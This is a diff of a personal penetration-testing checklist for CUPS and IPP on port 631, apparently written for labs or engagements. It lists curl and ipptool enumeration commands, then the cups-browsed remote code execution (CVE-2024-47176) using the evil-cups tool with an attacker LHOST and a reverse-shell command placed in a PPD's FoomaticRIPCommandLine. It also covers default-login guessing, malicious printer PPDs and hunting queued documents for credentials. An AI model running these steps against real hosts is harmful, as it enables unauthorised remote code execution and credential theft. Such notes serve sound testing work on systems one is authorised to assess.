@@ -1,31 +1,36 @@
-# CUPS / IPP
+# CUPS and IPP enumeration
 
 ## Before I start
-- [ ] 631/tcp (IPP + web admin) and/or 631/udp (cups-browsed) in the scan
+- [ ] 631/tcp in the scan, for IPP and the web pages, or 631/udp, for cups-browsed
 
-## Enum
+## What it shows
 curl -s http://<TargetIP>:631/ | head
 curl -s http://<TargetIP>:631/printers/
 curl -s http://<TargetIP>:631/jobs/
-- [ ] Web UI leaks printer names, queued docs, usernames, versions — collect even when admin needs auth
-- [ ] ipptool -tv ipp://<TargetIP>:631/ get-printer-attributes.test
+- [ ] Printer names, queued documents, usernames and versions from the web pages, even where the admin pages ask for a login
+ipptool, after sudo apt install -y cups-ipp-utils:
+ipptool -tv ipp://<TargetIP>:631/ get-printer-attributes.test
 
-## cups-browsed RCE (CVE-2024-47176, pre-Sept-2024 hosts)
-python3 evil-ipp.py <AttackerIP>
-python3 send_udp.py <TargetIP> <AttackerIP>
-- [ ] One UDP packet = rogue IPP server registered; PPD executes when anything prints
-- [ ] *FoomaticRIPCommandLine carries the payload; keep it a one-shot reverse shell
-- [ ] No print job = no exec — trigger a test page from the web UI if I can
+## cups-browsed RCE, CVE-2024-47176
+- [ ] A host not patched since September 2024, with cups-browsed listening on 631/udp
+IppSec's evilcups.py, from https://github.com/IppSec/evil-cups, in a virtual environment of its own:
+git clone https://github.com/IppSec/evil-cups
+python3 -m venv evil-cups/venv
+evil-cups/venv/bin/pip install -r evil-cups/requirements.txt
+evil-cups/venv/bin/python evil-cups/evilcups.py <LHOST> <TargetIP> 'THE-COMMAND'
+- [ ] One UDP packet registers my IPP server as a printer, and its PPD runs THE-COMMAND when anything prints to it
+- [ ] The command sits in the PPD's FoomaticRIPCommandLine: one reverse shell line, from :Pb shells
+- [ ] Nothing runs until a job prints: a test page from the web pages, if I can send one
 
-## Admin access
-- [ ] Creds tried: root/root, root/<OS password>, any lpadmin group member
-- [ ] Add printer with crafted PPD (*FoomaticRIPCommandLine / *cupsFilter) = command exec
-- [ ] /admin/log/error_log leaks paths + occasional creds
+## With a login
+- [ ] Logins tried: root with root, root with the system's own password, and any member of the lpadmin group
+- [ ] A printer added with a PPD of my own, its FoomaticRIPCommandLine or cupsFilter line set to my command: it runs when a job prints
+- [ ] /admin/log/error_log, for paths and the odd credential
 
 ## If it fails
-- [ ] 631 closed/filtered → printing not exposed; move on
-- [ ] Post-Sept-2024 → cups-browsed removed; admin-PPD path only
+- [ ] 631 closed or filtered: printing is not exposed
+- [ ] Patched since September 2024: cups-browsed no longer takes the packet, so only the PPD route with a login is left
 
 ## Next
-- [ ] lp/filter-user shell → :Pb linux-enum, :Pb sudo
-- [ ] Queue documents → :Pb linux-creds
+- [ ] A shell as lp or the filter's user: :Pb linux-enum, :Pb sudo
+- [ ] Documents from the queue, read for credentials: :Pb linux-creds
